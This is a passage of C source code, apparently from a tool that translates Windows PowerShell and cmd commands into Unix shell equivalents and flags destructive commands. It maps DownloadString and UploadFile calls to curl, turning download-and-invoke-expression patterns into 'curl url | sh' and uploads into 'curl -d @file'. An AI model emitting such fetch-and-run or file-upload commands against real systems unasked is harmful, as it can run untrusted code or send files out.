        for (const char *p = strcasestr(s, M[k].m); p; p = strcasestr(p + 1, M[k].m)) {
            const char *a = p + strlen(M[k].m);
            while (*a == ' ' || *a == '\'' || *a == '"') a++;
            size_t l = strcspn(a, "'\" ,)");
            char url[1024];
            if (!l || l >= sizeof url) continue;
            memcpy(url, a, l);
            url[l] = '\0';
            const char *rest = a + l;
            line_start(c, "curl");
            if (M[k].up) {   /* UploadFile(url, 'file') */
                const char *f = strchr(rest, ',');
                if (f) {
                    f++;
                    while (*f == ' ' || *f == '\'' || *f == '"') f++;
                    size_t fl = strcspn(f, "'\" )");
                    char file[1024];
                    if (fl && fl < sizeof file) {
                        memcpy(file, f, fl);
                        file[fl] = '\0';
                        char *ck = cook(file);
                        char arg[1100];
                        snprintf(arg, sizeof arg, "@%s", ck ? ck : file);
                        free(ck);
                        sb_adds(c->out, " -d");
                        emit_word(c->out, arg);
                    }
                }
            }
            emit_word(c->out, url);
            /* DownloadString piped into iex runs it */
            const char *before = p;
            int runs = 0;
            for (const char *b2 = s; b2 < before; b2++)
                if (!strncasecmp(b2, "iex", 3) || !strncasecmp(b2, "invoke-expression", 17)) runs = 1;
            if (strcasestr(rest, "| iex") || strcasestr(rest, "|iex") || runs) sb_adds(c->out, " | sh");
        }
    }
}

char *kai_winshell_translate(const char *cmd) {
    if (!cmd || !*cmd) return NULL;
    sb_t out;
    sb_init(&out);
    wctx c = {&out, 0, ""};
    ps_parse(&c, cmd, 0);
    cmd_parse(&c, cmd, 0);
    dotnet_calls(&c, cmd);
    if (!out.len) { sb_free(&out); return NULL; }
    return sb_take(&out);
}

int kai_winshell_destructive(const char *cmd, char *what, size_t n) {
    if (n) what[0] = '\0';
    if (!cmd || !*cmd) return 0;
    sb_t out;
    sb_init(&out);
    wctx c = {&out, 0, ""};
    ps_parse(&c, cmd, 0);
    if (!c.destructive) cmd_parse(&c, cmd, 0);
    sb_free(&out);
    if (c.destructive && n) kai_strlcpy(what, c.what, n);
    return c.destructive;
}
